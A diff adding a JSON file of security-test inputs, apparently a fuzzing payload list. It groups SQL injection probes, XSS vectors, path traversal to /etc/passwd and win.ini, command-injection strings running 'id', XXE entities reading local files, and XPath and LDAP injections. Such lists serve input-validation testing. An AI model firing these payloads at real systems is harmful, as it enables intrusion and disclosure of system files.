@@ -1,0 +1,73 @@
+{
+  "SQL Escape & Query Boundaries": {
+    "Standard Quote Escape": "' OR '1'='1",
+    "Double Quote Escape": "\" OR \"1\"=\"1",
+    "Parentheses Nesting Escape": "') OR ('1'='1",
+    "Standard Comment Line": "' --",
+    "MySQL Hash Comment": "' #",
+    "Union Select Column Probe 1": "' UNION SELECT NULL--",
+    "Union Select Column Probe 2": "' UNION SELECT NULL,NULL--",
+    "Union Select Column Probe 3": "' UNION SELECT NULL,NULL,NULL--",
+    "Union Select Column Probe 4": "' UNION SELECT NULL,NULL,NULL,NULL--",
+    "Union Select Column Probe 5": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+    "Database Brand Fingerprint": "' OR VERSION() > 1--",
+    "Stacked Query Separator": "'; SELECT 1;--"
+  },
+  "XSS & HTML Sanitization Tests": {
+    "Basic Script Tag": "<script>alert(1)</script>",
+    "Script Tag with Script Source": "<script src=\"data:text/javascript,alert(1)\"></script>",
+    "Nested Script Tag Bypass": "<scr<script>ipt>alert(1)</script>",
+    "Image Tag Error Trigger": "<img src=x onerror=alert(1)>",
+    "Body Tag Onload Trigger": "<body onload=alert(1)>",
+    "SVG Loaded Vector": "<svg onload=alert(1)>",
+    "Iframe JavaScript URL Source": "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "Input Tag Focus Trigger": "<input autofocus onfocus=alert(1)>",
+    "Link Anchor Tag Javascript Protocol": "<a href=\"javascript:alert(1)\">Click me</a>",
+    "XSLT Stylesheet Processing": "<?xml-stylesheet type=\"text/xsl\" href=\"#\"?>",
+    "JavaScript Literal Escapes": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+  },
+  "Directory Traversal & Path Boundaries": {
+    "Unix Basic Traversal": "../",
+    "Unix Deep Traversal": "../../../../../etc/passwd",
+    "Windows System Root File Access": "../../../../../windows/win.ini",
+    "URL Encoded Traversal Dot": "%2e%2e%2f",
+    "Double URL Encoded Traversal Dot": "%252e%252e%252f",
+    "Unicode Traversal Slash": "..%c0%af",
+    "Overlong UTF-8 Slash Bypass": "..%c1%9c",
+    "Null Byte Terminated Path": "../../../../../etc/passwd\u0000.jpg",
+    "UNC Path UNC Windows Share": "\\\\127.0.0.1\\c$\\windows\\win.ini"
+  },
+  "OS Command Boundary Characters": {
+    "Semicolon Command Linker": "; id ;",
+    "Pipe Output Forwarder": "| id |",
+    "Double Ampersand Logical Linker": "&& id &&",
+    "Double Pipe Logical Linker": "|| id ||",
+    "Subshell Interpolation Command": "$(id)",
+    "Backtick Shell Evaluation": "`id`",
+    "New Line Command Chain": "\nid\n",
+    "Carriage Return Linker": "\rid\r"
+  },
+  "Format Violations & Boundary Overflows": {
+    "Buffer Length (256 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "Buffer Length (1024 A's)": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "Invalid IP Address Format": "999.999.999.999",
+    "Invalid Email Double Dot": "user@domain..com",
+    "Negative Number Boundary": "-1",
+    "Zero Value Boundary": "0",
+    "Floating Point Precision Limit": "0.00000000000000000000000000000000000000000000000000000000000000000000001",
+    "Extremely Large Numeric Value": "99999999999999999999999999999999999999999999999999999999999999999999999999999",
+    "Unicode/Emoji Stress Characters": "𠜎 𠜱 𠝹 𠱓 𠱸 𠲖 𠲧 𠲼 𠵏 𠵘 𠵨 𠵫 𠵴 𠶧 𠶯 𠶳 𠶴 𠷔 𠷘 𠷤 𠷪 𠷯 𠷿 𠸎 𠸏 𠸖 𠸞 𠸢 𠸧 𠸫 𠸫 𠸱 𠸶 𠸷 𠸹 𠹊 𠹏 𠹗 𠹷 𠹻 𠺕 𠺖 𠺡 𠺢 𠺧 𠺨 𠺬 𠻗 𠻘 𠻤 𠻥 𠻪 𠻬 𠻱 𠻴 𠻵",
+    "Null Byte String Injection": "test\u0000value"
+  },
+  "XML & XPath Escapes": {
+    "Basic XML Tag Inject": "<xml>test</xml>",
+    "XPath Boolean Bypass": "' or 1=1 or ''='",
+    "XPath Element Inject": "'] | //* | ['",
+    "XML External Entity Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\">]><value>&ent;</value>",
+    "XML Local File System Attack Vector": "<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///windows/win.ini\">]><value>&ent;</value>"
+  },
+  "LDAP Search Boundaries": {
+    "LDAP Boolean Query True": "*)(objectClass=*",
+    "LDAP Filter Inject": "*))(|(uid=*"
+  }
+}
